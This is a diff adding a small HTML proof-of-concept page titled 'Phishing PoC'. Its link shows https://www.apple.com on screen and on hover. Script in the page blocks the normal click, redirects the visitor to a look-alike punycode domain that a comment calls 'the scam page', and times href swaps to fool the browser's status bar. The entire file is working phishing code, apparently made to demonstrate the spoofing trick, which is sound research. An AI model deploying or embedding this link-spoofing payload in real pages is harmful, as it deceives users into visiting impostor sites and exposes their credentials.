@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Phishing PoC</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	</head>
+	<body>
+		<!-- When the user hovers over the link, point to the correct URL for 50ms -->
+		Just an ordinary link to Apple: <a href="https://www.apple.com"
+		onmouseover="apply('https://www.xn--80ak6aa92e.com')"
+		onmouseout="apply('https://www.apple.com')">https://www.apple.com</a>
+		<script>
+			a = document.getElementsByTagName("a")[0];
+			// When we click the link
+			a.addEventListener("click", function(event) { 
+				// Don't open the link as usual
+				event.preventDefault(); 
+				// Instead manually visit the scam page
+				window.location = "https://www.xn--80ak6aa92e.com"; 
+			});
+			
+			function apply (url) {
+				// After the browser collects the HREF and shows the user, then change the URL
+				setTimeout(function () {a.href = url;}, 150);
+			}
+		</script>
+	</body>
+</html>
